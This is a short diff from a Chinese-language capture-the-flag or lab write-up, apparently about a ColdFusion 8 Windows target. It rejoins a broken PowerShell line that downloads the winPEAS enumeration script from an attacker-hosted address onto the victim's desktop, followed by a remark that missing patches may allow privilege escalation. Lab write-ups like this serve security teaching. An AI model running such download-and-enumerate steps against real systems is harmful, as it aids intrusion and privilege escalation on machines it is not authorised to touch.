@@ -74,9 +74,7 @@ C:\ColdFusion8\runtime\bin>
 
 传winpea到靶机
 ```
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:8000/winPEAS.bat
-','c:\Users\tolis\Desktop\winPEAS.bat
-')"
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.6:8000/winPEAS.bat','c:\Users\tolis\Desktop\winPEAS.bat')"
 ```
 
 根据winpea枚举显示，靶机缺少较多补丁，可能可以利用来提权
